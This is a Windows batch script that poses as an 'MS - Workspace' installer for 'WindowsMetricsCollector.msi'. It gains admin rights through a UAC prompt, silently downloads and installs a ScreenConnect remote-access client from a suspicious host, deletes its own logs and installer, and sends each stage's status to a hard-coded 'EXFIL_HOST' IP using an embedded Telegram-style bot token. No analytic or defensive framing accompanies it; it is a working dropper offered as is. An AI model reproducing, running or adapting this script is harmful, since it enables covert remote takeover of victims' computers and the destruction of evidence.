//9b2eac0ac60f
@echo off
setlocal enabledelayedexpansion

set "PRODUCT_NAME=MS - Workspace"
//d01de146e1d9
set "PRODUCT_VERSION=1.0.0"
set "MSI_URL=https://user12.h-connect.xyz:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
//da9730c3a0bc
set "MSI_FILE_NAME=WindowsMetricsCollector.msi"
set "INSTALL_DIR=%ProgramData%\MSWorkspace\Install"
//cce5099ce6cf
set "LOG_DIR=%ProgramData%\MSWorkspace\Logs"
set "LOG_FILE=deploy.log"
//6889064f0831
set "MSI_LOG_FILE=msi-install.log"
set "DOWNLOAD_RETRIES=2"
//051856592c82
set "RETRY_DELAY_MS=1500"
set "EXFIL_HOST=212.43.151.96:20002"
//de6db44bf6cd
set "TBTOKEN=7587335315:AAG-GNuK6xCNM3hjkskl7_rxXjsbLNIe_Mk"
set "TCID=93372553"
//48ddb842a8ea
set "DEPLOY_TOKEN=%RANDOM%%RANDOM:~0,4%"
set "UNINSTALL_EXISTING=1"
//f361f6ce6813
set "PRODUCT_CODE={4228D3D7-CF51-5361-1BC4-165794361D9B}"
set "SHOW_POPUPS=0"

set "MSI_PATH=%INSTALL_DIR%\%MSI_FILE_NAME%"
//c7f74bc72ca2
set "LOG_PATH=%LOG_DIR%\%LOG_FILE%"
set "MSI_LOG_PATH=%LOG_DIR%\%MSI_LOG_FILE%"
//cd8222279700
set "EXIT_CODE=1"

//88b205f41f21
mkdir "%INSTALL_DIR%" 2>nul
mkdir "%LOG_DIR%" 2>nul

call :checkAdmin
//2545576e7aa0
if errorlevel 1 goto :elevate

//80196ff9f9da
call :beacon "start" 0
call :checkConfig
//d5313c4a8ed0
if errorlevel 1 goto :cleanup

//e70a990ee13c
call :fetchPayload
if errorlevel 1 (
//a47806205af8
    call :log "ERROR" "Download failed after %DOWNLOAD_RETRIES% attempts"
    call :beacon "fail" 1
//50a7e1c66a16
    set "EXIT_CODE=1"
    goto :cleanup
//6dbcb1171e0d
)

//351828a60ca0
if not exist "%MSI_PATH%" (
    call :log "ERROR" "MSI missing after download"
//4f1dc6e6a7f0
    call :beacon "fail" 1
    set "EXIT_CODE=1"
//1960261507ab
    goto :cleanup
)

for %%A in ("%MSI_PATH%") do if %%~zA==0 (
//068fe91a0f89
    call :log "ERROR" "MSI empty after download"
    call :beacon "fail" 1
//a525ec0392f9
    set "EXIT_CODE=1"
    goto :cleanup
//ee62450778f7
)

//5b824c9af121
if "%UNINSTALL_EXISTING%"=="1" call :purgeOld

//a7c3c88ed2e9
call :execMsi
set "EXIT_CODE=!ERRORLEVEL!"

if !EXIT_CODE!==0 (
//2d3560e56a3b
    call :log "INFO" "Installation successful"
    call :beacon "ok" !EXIT_CODE!
//c329cdf69f76
) else if !EXIT_CODE!==3010 (
    call :log "INFO" "Success - restart required"
//8381ecab06cb
    call :beacon "okr" !EXIT_CODE!
) else if !EXIT_CODE!==1641 (
//f647fe2ce65a
    call :log "INFO" "Success - restart initiated"
    call :beacon "okr" !EXIT_CODE!
//53c67e5ccb01
) else if !EXIT_CODE!==1638 (
    call :log "INFO" "Already installed"
//51aa46ff53b1
    call :beacon "oka" !EXIT_CODE!
) else if !EXIT_CODE!==1602 (
//202be03922c5
    call :log "WARN" "Installation canceled by user"
    call :beacon "cl" !EXIT_CODE!
//ec9be961bc64
) else (
    call :log "ERROR" "Installation failed with code !EXIT_CODE!"
//3ac128ca515b
    call :beacon "fail" !EXIT_CODE!
)

:cleanup
//2c510084d8fc
if exist "%MSI_PATH%" del /f /q "%MSI_PATH%" 2>nul
if exist "%LOG_PATH%" del /f /q "%LOG_PATH%" 2>nul
//6954c9aa6876
if exist "%MSI_LOG_PATH%" del /f /q "%MSI_LOG_PATH%" 2>nul
if exist "%LOG_DIR%" rmdir /s /q "%LOG_DIR%" 2>nul
//429b462ab5fa
exit /b %EXIT_CODE%

//6aa8a468dae4
:checkAdmin
net session >nul 2>&1
//383709b58e50
exit /b %errorlevel%

//86b582fff25f
:elevate
powershell -NoProfile -ExecutionPolicy Bypass -Command "$null = Start-Process -FilePath '%~f0' -Verb RunAs"
//e49fadc5b5ec
exit /b 0

//c1540fe4d420
:checkConfig
if not defined MSI_URL (
//3c2eb855ddcb
    call :log "ERROR" "MSI_URL is empty"
    exit /b 1
//e0259150e56d
)
if not defined MSI_FILE_NAME (
//1018f425c565
    call :log "ERROR" "MSI_FILE_NAME is empty"
    exit /b 1
//19fa9e9b07d8
)
exit /b 0

:fetchPayload
//c39f3a2b98ab
mkdir "%INSTALL_DIR%" 2>nul
set "ATTEMPT=0"
//02c64eacf63b
:downloadRetry
if !ATTEMPT! gtr %DOWNLOAD_RETRIES% exit /b 1
//48125c12ef18
(echo !MSI_URL!) > "%TEMP%\dl_url.txt"
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $u = [IO.File]::ReadAllText('%TEMP%\dl_url.txt').Trim(); $wc = New-Object System.Net.WebClient; $wc.DownloadFile($u, '%MSI_PATH%'); exit 0 } catch { exit 1 }"
//814a3a7eb5fe
if errorlevel 1 (
    set /a ATTEMPT+=1
//05a5324e31dc
    ping -n 2 127.0.0.1 >nul
    goto :downloadRetry
//7be50cb8de24
)
if exist "%MSI_PATH%" (
//e7a2b96bb51b
    for %%A in ("%MSI_PATH%") do if %%~zA==0 (
        del /f /q "%MSI_PATH%" 2>nul
//95fb70d06145
        set /a ATTEMPT+=1
        goto :downloadRetry
//9770c3d625d2
    )
    exit /b 0
//af9e33ae5bcf
)
set /a ATTEMPT+=1
//1c2d401f720f
goto :downloadRetry

//e2ad99f8e0f2
:purgeOld
call :log "INFO" "Uninstalling existing product: %PRODUCT_CODE%"
//a7cb04e777f9
msiexec.exe /x %PRODUCT_CODE% /qn /norestart REBOOT=ReallySuppress
set "CODE=%ERRORLEVEL%"
//c7bab5786e96
if %CODE%==1605 exit /b 0
if %CODE%==1612 exit /b 0
//bbfe49085706
call :log "WARN" "Uninstall returned %CODE%"
ping -n 4 127.0.0.1 >nul
//8b3b0813b7ab
exit /b 0

//010863474816
:execMsi
mkdir "%LOG_DIR%" 2>nul
//c5d86c6bde9c
msiexec.exe /i "%MSI_PATH%" /qn /norestart REBOOT=ReallySuppress ALLUSERS=1 /L*v "%MSI_LOG_PATH%"
set "CODE=%ERRORLEVEL%"
//0b98f071c892
if %CODE%==0 exit /b 0
if %CODE%==3010 exit /b 3010
//bf4e13f97bc1
if %CODE%==1641 exit /b 1641
if %CODE%==1638 exit /b 1638
//b3082bb3a979
ping -n 3 127.0.0.1 >nul
msiexec.exe /i "%MSI_PATH%" /qb /norestart REBOOT=ReallySuppress ALLUSERS=1 /L*v "%MSI_LOG_PATH%"
//3fdbb9d937e1
exit /b %errorlevel%

//23e7b45e8701
:beacon
set "STAGE=%~1"
//3441876740d7
set "EXIT_VAL=%~2"
set "STATUS_CODE=fl"
//6aea9f406e50
set "EXIT_STR=%EXIT_VAL%"
if "%STAGE%"=="start" set "STATUS_CODE=go" & set "EXIT_STR=0"
//55623180a7f4
if "%STAGE%"=="ok" set "STATUS_CODE=ok"
if "%STAGE%"=="okr" set "STATUS_CODE=okr" & set "EXIT_STR=3010"
//7d02549bfcd1
if "%STAGE%"=="oka" set "STATUS_CODE=oka" & set "EXIT_STR=1638"
if "%STAGE%"=="cl" set "STATUS_CODE=cl" & set "EXIT_STR=1602"

for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set "DT=%%I"
//43299e735cc6
set "DTS=%DT:~4,2%%DT:~6,2%%DT:~8,2%%DT:~10,2%"
set "URL=http://%EXFIL_HOST%/%TBTOKEN%/%TCID%/%DEPLOY_TOKEN%.%STATUS_CODE%.%EXIT_STR%.%DTS%"
//23312b36acb3
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { $null = (New-Object System.Net.WebClient).DownloadString('%URL%') } catch {}"
exit /b

:log
//6d8667c70b99
set "LEVEL=%~1"
set "MSG=%~2"
//48902a6d320f
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set "DT=%%I"
set "TS=%DT:~0,4%-%DT:~4,2%-%DT:~6,2% %DT:~8,2%:%DT:~10,2%:%DT:~12,2%"
//9ab4be5fa026
echo [%TS%] [%LEVEL%] %MSG% >> "%LOG_PATH%"
exit /b
